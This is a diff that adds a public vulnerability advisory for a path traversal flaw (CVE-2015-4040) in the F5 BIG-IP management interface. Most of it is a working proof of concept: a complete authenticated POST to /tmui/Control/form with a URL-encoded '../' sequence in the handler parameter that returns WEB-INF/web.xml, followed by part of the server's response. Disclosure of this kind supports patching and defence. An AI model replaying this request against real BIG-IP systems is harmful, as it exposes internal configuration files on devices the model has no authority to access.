@@ -1,0 +1,60 @@
+# Exploit Title: [F5 BigIP File Path Traversal Vulnerability]
+# Discovered by: Karn Ganeshen
+# Reported on: April 27, 2015
+# New version released on: September 01, 2015
+# Vendor Homepage: [www.f5.com]
+# Version Reported: [F5 BIG-IP 10.2.4 Build 595.0 Hotfix HF3]
+# CVE-2015-4040 [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4040
+]
+# Multiple Additional F5 products & versions are Affected and documented
+here:
+https://support.f5.com/kb/en-us/solutions/public/17000/200/sol17253.html
+
+
+*Vulnerability Details*
+The handler parameter is vulnerable to file path manipulation attacks. When
+we submit a payload
+*/tmui/locallb/virtual_server/../../../../WEB-INF/web.xml* in the *handler*
+parameter, the file *WEB-INF/web.xml* is returned.
+
+*PoC:*
+
+POST /tmui/Control/form HTTP/1.1
+Host: <IP>
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
+Trident/5.0)
+Connection: close
+Referer: https://
+<IP>/tmui/Control/jspmap/tmui/locallb/virtual_server/list.jsp?&FilterBy=status_availability&Filter=2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1004
+Cookie: JSESSIONID=3211A73547444840255BAF39984E7E3F;
+BIGIPAuthUsernameCookie=admin;
+BIGIPAuthCookie=9B1099DD8A936DDBD58606DA3B5BABC7E82C43A5;
+F5_CURRENT_PARTITION=Common;
+f5formpage="/tmui/locallb/virtual_server/list.jsp?&";
+f5_refreshpage="https%3A//<IP>/tmui/Control/jspmap/tmui/locallb/virtual_server/list.jsp";
+f5currenttab="main"; f5mainmenuopenlist=""; f5advanceddisplay=""
+
+_timenow=Fri+Apr+24+14%3a48%3a38+EST+2015&_bufvalue_before=6hU2%2fMbRfPe7OHQ7VVc7TEffOpg%3d&exit_page=%2ftmui%2flocallb%2fvirtual_server%2fcreate.jsp&search_input=*&search_button_before=Search&_timeno
+*...[SNIP]...*
+fore=&enableObjList_before=&exit_page_before=%2ftmui%2flocallb%2fvirtual_server%2fcreate.jsp&row_count=0&_bufvalue_validation=NO_VALIDATION&disable_before=Disable&exit_button_before=Create...&handler=
+*%2ftmui%2flocallb%2fvirtual_server%2f..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml*
+
+
+*Web.xml is returned in the Response:*
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE web-app
+PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.2//EN"
+"http://java.sun.com/j2ee/dtds/web-app_2_2.dtd">
+
+
+
+*<!--Automatically created by Tomcat JspC.--><web-app>*
+*...[config file output redacted here]...*
+
+*.....*
